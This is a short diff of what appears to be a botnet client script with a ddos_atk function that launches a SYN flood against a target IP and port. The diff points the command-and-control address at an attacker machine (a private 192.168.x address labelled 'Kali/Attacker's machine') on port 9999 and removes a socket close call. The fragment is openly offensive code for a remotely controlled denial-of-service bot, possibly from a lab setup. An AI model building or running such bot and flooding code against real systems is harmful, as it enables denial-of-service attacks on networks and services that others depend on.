@@ -64,7 +64,6 @@ def ddos_atk():
 			print("Starting SYN Flood on " + target_ip + ":" + str(target_port) + " Number of packet sent: " + str(total))
 	
 	print("Stopping attack...")
-	sock.close()
 	
 
 target_ip = ""
@@ -72,7 +71,7 @@ target_port = 0
 ddos_type = ""
 start_atk = False
 
-server_ip = "localhost" # Kali/Attacker's machine
+server_ip = "192.168.10.129" # Kali/Attacker's machine
 port = 9999 # Kali/Attacker's machine listening port
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect((server_ip, port))
